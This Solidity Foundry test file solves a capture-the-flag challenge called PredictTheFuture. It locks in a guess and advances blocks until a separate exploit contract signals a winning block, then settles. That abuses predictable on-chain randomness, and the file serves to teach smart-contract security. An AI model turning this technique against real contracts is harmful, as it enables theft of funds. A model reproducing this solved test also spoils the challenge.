// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/PredictTheFuture.sol";

contract PredictTheFutureTest is Test {
    address user;
    PredictTheFuture public predictTheFuture;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheFuture = (new PredictTheFuture){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheFuture);
         user = vm.addr(1);
    }

    function testGuess() public {
        // Set block number and timestamp
        // Use vm.roll() and vm.warp() to change the block.number and block.timestamp respectively
        vm.deal(user, 100 ether);
        vm.startPrank(user);
        vm.roll(104293);
        vm.warp(93582192);

        // Put your solution here

        // solutionis from 0 to 9. We can pick one of those and wait for blocks and check is answer valid, as we know 
        // how it is calculated
        uint8 guessNumber = 8;
        predictTheFuture.lockInGuess{value: 1 ether}(guessNumber);
        vm.roll(block.number + 10);

        bool isBlockForExploitReached = false;
        while (!isBlockForExploitReached) {
            isBlockForExploitReached = exploitContract.isBlockForExploit(guessNumber);
            if(isBlockForExploitReached) {
                predictTheFuture.settle();
            }
            vm.roll(block.number + 1);
        }

        // assert
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheFuture.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}